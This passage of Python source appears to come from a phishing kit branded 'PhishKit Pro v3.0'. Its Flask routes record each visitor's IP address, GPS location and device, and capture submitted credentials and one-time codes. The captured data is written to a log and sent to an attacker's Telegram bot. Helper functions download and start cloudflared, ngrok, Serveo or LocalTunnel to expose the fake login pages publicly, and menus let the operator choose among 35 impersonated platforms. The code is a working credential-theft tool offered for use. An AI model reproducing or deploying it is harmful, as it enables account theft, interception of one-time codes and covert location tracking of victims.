        ts  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        mapurl = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None

        sep = f"{D}{'─'*52}{N}"
        print(f"\n{sep}")
        print(f"{C}  📡 PAGE VISIT — {ts}{N}")
        print(sep)
        print(f"  {Y}🌐 Platform :{N} {W}{pk.upper()}{N}")
        print(f"  {Y}👤 IP Addr  :{N} {W}{ip}{N}")
        if lat and lon:
            print(f"  {Y}📍 Location :{N} {W}Lat {lat}, Lon {lon}{N}")
            print(f"  {Y}🗺  Maps URL :{N} {C}{mapurl}{N}")
        else:
            print(f"  {Y}📍 Location :{N} {R}GPS off / permission denied{N}")
        print(f"  {Y}📱 Device   :{N} {D}{ua[:60]}...{N}")
        print(sep)

        # save visit log
        with open(CREDS_FILE,'a') as f:
            f.write(f"[{ts}] VISIT | platform={pk} ip={ip} lat={lat} lon={lon} map={mapurl}\n")

        # Telegram
        if _TG_TOKEN not in ("","disabled"):
            msg=(f"📡 *PAGE VISIT*\n"
                 f"Platform: `{pk.upper()}`\n"
                 f"IP: `{ip}`\n"
                 f"Location: {'[📍 Map]('+mapurl+')' if mapurl else '❌ GPS off'}")
            try:
                urllib.request.urlopen(urllib.request.Request(
                    f"https://api.telegram.org/bot{_TG_TOKEN}/sendMessage",
                    data=json.dumps({"chat_id":_TG_CHAT,"text":msg,"parse_mode":"Markdown"}).encode(),
                    headers={"Content-Type":"application/json"}
                ),timeout=5)
            except: pass
    except: pass
    return jsonify({"ok":True})

@app.route('/collect', methods=['POST'])
def collect():
    """Receives OTP / special form data from JS"""
    try:
        d  = request.get_json(force=True,silent=True) or {}
        ip = request.headers.get('X-Forwarded-For',request.remote_addr)
        d['ip'] = d.get('ip',ip)
        log_cred(active.get('platform_key','unknown'), d, d.get('ip','N/A'))
    except: pass
    return jsonify({"ok":True})

# ══════════════════════════════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════════════════════════════

def log_cred(platform, data, ip):
    ts  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    sep = "="*60
    line= f"\n{sep}\n[{ts}] PLATFORM: {platform.upper()}\nIP: {ip}\n"
    for k,v in data.items():
        if k not in ('type',):
            line += f"{k.upper():15}: {v}\n"
    line += sep

    with open(CREDS_FILE,'a') as f:
        f.write(line+'\n')

    sep2 = f"{D}{'─'*52}{N}"
    print(f"\n{sep2}")
    print(f"{G}  🔥 CREDENTIALS CAPTURED — {ts}{N}")
    print(sep2)
    print(f"  {Y}🌐 Platform :{N} {W}{platform.upper()}{N}")
    print(f"  {Y}👤 IP Addr  :{N} {W}{ip}{N}")
    for k,v in data.items():
        if k not in ('type',):
            print(f"  {Y}{k.upper():13}:{N} {W}{v}{N}")
    print(sep2)

    if _TG_TOKEN not in ("","disabled"):
        try:
            lines=[f"🔥 *CREDS CAPTURED*\nPlatform: `{platform.upper()}`\nIP: `{ip}`"]
            for k,v in data.items():
                if k not in ('type',):
                    lines.append(f"{k.upper()}: `{v}`")
            urllib.request.urlopen(urllib.request.Request(
                f"https://api.telegram.org/bot{_TG_TOKEN}/sendMessage",
                data=json.dumps({"chat_id":_TG_CHAT,"text":'\n'.join(lines),"parse_mode":"Markdown"}).encode(),
                headers={"Content-Type":"application/json"}
            ),timeout=5)
        except: pass

# ══════════════════════════════════════════════════════════════════════════════
# TUNNELS
# ══════════════════════════════════════════════════════════════════════════════

def get_local_ip():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
    except: return "127.0.0.1"

def kill_port(port):
    try: subprocess.run(["fuser","-k",f"{port}/tcp"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except: pass
    try:
        r=subprocess.run(["sh","-c",f"ss -tlnp 2>/dev/null|grep :{port}|grep -oP 'pid=\\K[0-9]+'"],capture_output=True,text=True)
        for pid in r.stdout.strip().split():
            if pid.isdigit():os.kill(int(pid),signal.SIGKILL)
    except: pass
    time.sleep(0.8)

def start_flask(port):
    import logging as lg
    lg.getLogger('werkzeug').setLevel(lg.ERROR)
    kill_port(port)
    app.run(host='0.0.0.0',port=port,debug=False,use_reloader=False)

def get_cloudflare(port):
    import platform,shutil
    cf=shutil.which("cloudflared") or os.path.join(WORKDIR,"cloudflared")
    if not os.path.exists(cf):
        print(f"{G}[+] Downloading cloudflared...{N}")
        arch=platform.machine().lower()
        if   "aarch64" in arch or "arm64" in arch: url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif "arm" in arch:                        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        else:                                      url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        cf=os.path.join(WORKDIR,"cloudflared"); urllib.request.urlretrieve(url,cf); os.chmod(cf,0o755)
    log=os.path.join(WORKDIR,"cf.log")
    proc=subprocess.Popen([cf,"tunnel","--url",f"http://localhost:{port}","--no-autoupdate"],stdout=open(log,"w"),stderr=subprocess.STDOUT)
    print(f"{D}[*] Starting Cloudflare tunnel...{N}")
    for _ in range(25):
        time.sleep(1)
        try:
            with open(log) as lf:
                m=re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com",lf.read())
            if m: return m.group(0),proc
        except: pass
    return None,proc

def get_ngrok(port):
    import platform,shutil
    ng=shutil.which("ngrok") or os.path.join(WORKDIR,"ngrok")
    if not os.path.exists(ng):
        print(f"{G}[+] Downloading ngrok...{N}")
        arch=platform.machine().lower()
        if   "aarch64" in arch or "arm64" in arch: url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
        elif "arm" in arch:                        url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
        else:                                      url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
        tgz=os.path.join(WORKDIR,"ngrok.tgz"); urllib.request.urlretrieve(url,tgz)
        subprocess.run(["tar","-xf",tgz,"-C",WORKDIR],check=True); os.remove(tgz)
        ng=os.path.join(WORKDIR,"ngrok"); os.chmod(ng,0o755)
    log=os.path.join(WORKDIR,"ngrok.log")
    proc=subprocess.Popen([ng,"http",str(port),f"--log={log}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    print(f"{D}[*] Starting Ngrok...{N}")
    for _ in range(20):
        time.sleep(1)
        try:
            r=urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
            for t in json.loads(r.read()).get("tunnels",[]):
                u=t.get("public_url","")
                if u.startswith("https"): return u,proc
        except: pass
    return None,proc

def get_serveo(sub,port):
    log=os.path.join(WORKDIR,"serveo.log")
    proc=subprocess.Popen(["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=60","-R",f"{sub}:80:localhost:{port}","serveo.net"],stdout=open(log,"w"),stderr=subprocess.STDOUT)
    print(f"{D}[*] Starting Serveo...{N}")
    for _ in range(16):
        time.sleep(1)
        try:
            with open(log) as lf:
                if "Forwarding" in lf.read() or sub in lf.read(): return f"https://{sub}.serveo.net",proc
        except: pass
    return f"https://{sub}.serveo.net",proc

def get_localtunnel(port):
    try:
        proc=subprocess.Popen(["lt","--port",str(port)],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
        print(f"{D}[*] Starting LocalTunnel...{N}")
        for line in proc.stdout:
            m=re.search(r"https://[a-zA-Z0-9\-]+\.loca\.lt",line)
            if m: return m.group(0),proc
    except: pass
    return None,None

# ══════════════════════════════════════════════════════════════════════════════
# BANNER + MENUS
# ══════════════════════════════════════════════════════════════════════════════

def banner():
    os.system("cls" if os.name=="nt" else "clear")
    print(f"""
{R}  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗  ██╗██╗████████╗{N}
{R}  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║ ██╔╝██║╚══██╔══╝{N}
{R}  ██████╔╝███████║██║███████╗███████║█████╔╝ ██║   ██║   {N}
{R}  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔═██╗ ██║   ██║   {N}
{R}  ██║     ██║  ██║██║███████║██║  ██║██║  ██╗██║   ██║   {N}
{R}  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   {N}
{M}         ____  ____  ____  ___  ____  ____  ____  ____    {N}
{M}        / ___||  _ \| __ )| __|/ ___||  _ \/ ___||  _ \\   {N}
{M}        \\___ \\| |_) |  _ < _| | |    | |_) \\___  | |_) |  {N}
{M}         ___) |  __/| |_) | |__| |___|  _ < ___) |  __/   {N}
{M}        |____/|_|   |____/|_____\\____|_| \\_\\____/|_|       {N}

{Y}      PhishKit Pro v3.0 — ULTRA EDITION{N}
{D}  ──────────────────────────────────────────────────────────{N}
{R}   Author : Ochena Gamer  |  Team : Bangladesh Cyber Spectre (BCS){N}
{D}  ──────────────────────────────────────────────────────────{N}
{D}   35 Platforms  |  5 Tunnels  |  IP+GPS on page load{N}
{D}  ──────────────────────────────────────────────────────────{N}
""")

def platform_menu():
    banner()
    cols=2; items=list(PLATFORMS.items())
    print(f"{C}  ╔══════════════════════════════════════════════════════╗{N}")
    print(f"{C}  ║           SELECT TARGET PLATFORM                    ║{N}")
    print(f"{C}  ╚══════════════════════════════════════════════════════╝{N}\n")
    for i in range(0,len(items),cols):
        row=items[i:i+cols]
        line=""
        for k,(name,_,_) in row:
            line+=f"  {W}[{R}{k.rjust(2)}{W}]{N} {Y}{name:<18}{N}"
        print(line)
    print(f"\n  {W}[{R} 0{W}]{N} {Y}Exit{N}\n")

    while True:
        c=input(f"  {C}Select platform: {N}").strip()
        if c=="0": sys.exit(0)
        if c in PLATFORMS: return c
        print(f"  {R}Invalid.{N}")

def template_menu(pk):
    banner()
    p_name = PLATFORMS[pk][0]
    templates = list(PAGES.get(PLATFORMS[pk][2],{}).keys())

    print(f"{C}  ╔══════════════════════════════════════════════════════╗{N}")
    print(f"{C}  ║   SELECT TEMPLATE — {p_name:<33}║{N}")
    print(f"{C}  ╚══════════════════════════════════════════════════════╝{N}\n")

    for i,tk in enumerate(templates,1):
        label=TEMPLATE_NAMES.get(tk,tk)
        print(f"  {W}[{R}{i}{W}]{N} {Y}{label}{N}")
    print(f"\n  {W}[{R}0{W}]{N} {Y}← Back{N}\n")

    while True:
        c=input(f"  {C}Select template: {N}").strip()
        if c=="0": return None
        if c.isdigit() and 1<=int(c)<=len(templates):
            return templates[int(c)-1]
        print(f"  {R}Invalid.{N}")

def tunnel_menu():
    banner()
    print(f"{C}  ╔══════════════════════════════════════════════════════╗{N}")
    print(f"{C}  ║           SELECT TUNNEL / DELIVERY METHOD           ║{N}")
    print(f"{C}  ╚══════════════════════════════════════════════════════╝{N}\n")
    opts=[
        ("1","Localhost",         "Same device / LAN  (HTTP — no GPS)"),
        ("2","Cloudflare Tunnel", "HTTPS — GPS works ✓ — no account"),
        ("3","Ngrok",             "HTTPS — GPS works ✓ — free tier"),
        ("4","Serveo.net",        "HTTPS — GPS works ✓ — SSH tunnel"),
        ("5","LocalTunnel",       "HTTPS — GPS works ✓ — npm install -g localtunnel"),
    ]
    for n,name,desc in opts:
        print(f"  {W}[{R}{n}{W}]{N} {Y}{name:<20}{N} {D}{desc}{N}")
    print()

    while True:
        c=input(f"  {C}Select tunnel: {N}").strip()
        if c in [o[0] for o in opts]: return c
        print(f"  {R}Invalid.{N}")

def tg_menu():
    banner()
    print(f"{C}  ╔══════════════════════════════════════════════════════╗{N}")
    print(f"{C}  ║           TELEGRAM CONFIGURATION (optional)         ║{N}")
    print(f"{C}  ╚══════════════════════════════════════════════════════╝{N}\n")
    print(f"  {D}Results always show in terminal.{N}")
    print(f"  {D}Set Telegram bot to also receive via Telegram.{N}\n")
    tok=input(f"  {Y}Bot Token  {N}[Enter=skip]: ").strip()
    cid=input(f"  {Y}Chat ID    {N}[Enter=skip]: ").strip()
    return tok,cid

def wait_loop(proc=None):
    cap=CREDS_FILE
    print(f"\n{G}  ✓ Server running. Waiting for targets...{N}")
    print(f"  {D}Logs: {cap}{N}")
    print(f"  {W}Press Ctrl+C to stop{N}\n")
    print(f"  {D}{'─'*50}{N}")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{R}  [!] Stopping...{N}")
        if proc:
            try: proc.terminate()
            except: pass
        print(f"{G}  Done. Logs: {cap}{N}\n")
        sys.exit(0)

# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    # 1 — select platform
    pk = platform_menu()
    p_name, p_redir, p_key = PLATFORMS[pk]

    # 2 — select template
    tk = template_menu(pk)
    if not tk: main(); return

    # 3 — select tunnel
    tm = tunnel_menu()

    # 4 — port
    banner()
    port_in=input(f"  {Y}Port {D}[Enter=8080]{N}: ").strip()
    port=int(port_in) if port_in.isdigit() else 8080

    # set active
    active['platform_key']  = p_key
    active['template_key']  = tk
    active['redirect_url']  = p_redir

    # start Flask
    threading.Thread(target=start_flask,args=(port,),daemon=True).start()
    time.sleep(2)

    banner()
    link=None; proc=None

    if tm=="1":
        lip=get_local_ip()
        link=f"http://{lip}:{port}"
        print(f"\n{Y}  [+] Platform   : {W}{p_name}{N}")
        print(f"{Y}  [+] Template   : {W}{TEMPLATE_NAMES.get(tk,tk)}{N}")
        print(f"{Y}  [+] Local Link : {W}{link}{N}")
        print(f"{R}  [!] GPS requires HTTPS — use Cloudflare/Ngrok for location capture{N}")
    elif tm=="2":
        link,proc=get_cloudflare(port)
        if link:
            print(f"\n{Y}  [+] Platform    : {W}{p_name}{N}")
            print(f"{Y}  [+] Template    : {W}{TEMPLATE_NAMES.get(tk,tk)}{N}")
            print(f"{Y}  [+] Cloudflare  : {W}{link}{N}")
            print(f"{G}  [+] HTTPS ✓ GPS capture enabled{N}")
        else:
            print(f"{R}  [!] Cloudflare failed — cf.log{N}"); return
    elif tm=="3":
        link,proc=get_ngrok(port)
        if link:
            print(f"\n{Y}  [+] Platform : {W}{p_name}{N}")
            print(f"{Y}  [+] Template : {W}{TEMPLATE_NAMES.get(tk,tk)}{N}")
            print(f"{Y}  [+] Ngrok    : {W}{link}{N}")
            print(f"{G}  [+] HTTPS ✓ GPS capture enabled{N}")
        else:
            print(f"{R}  [!] Ngrok failed — ngrok.log{N}"); return
    elif tm=="4":
        sub=input(f"\n  {Y}Subdomain [e.g. spectre123]: {N}").strip() or f"spectre{int(time.time())%9999}"
        link,proc=get_serveo(sub,port)
        print(f"\n{Y}  [+] Platform : {W}{p_name}{N}")
        print(f"{Y}  [+] Template : {W}{TEMPLATE_NAMES.get(tk,tk)}{N}")
        print(f"{Y}  [+] Serveo   : {W}{link}{N}")
    elif tm=="5":
        link,proc=get_localtunnel(port)
        if link:
            print(f"\n{Y}  [+] Platform     : {W}{p_name}{N}")
            print(f"{Y}  [+] LocalTunnel  : {W}{link}{N}")
        else:
            print(f"{R}  [!] LocalTunnel failed. Install: npm install -g localtunnel{N}"); return

    if not link: return

    try:
        import webbrowser; webbrowser.open(link)
        print(f"  {D}[*] Opened in browser{N}")
    except: pass

    wait_loop(proc)

if __name__=="__main__":
    main()
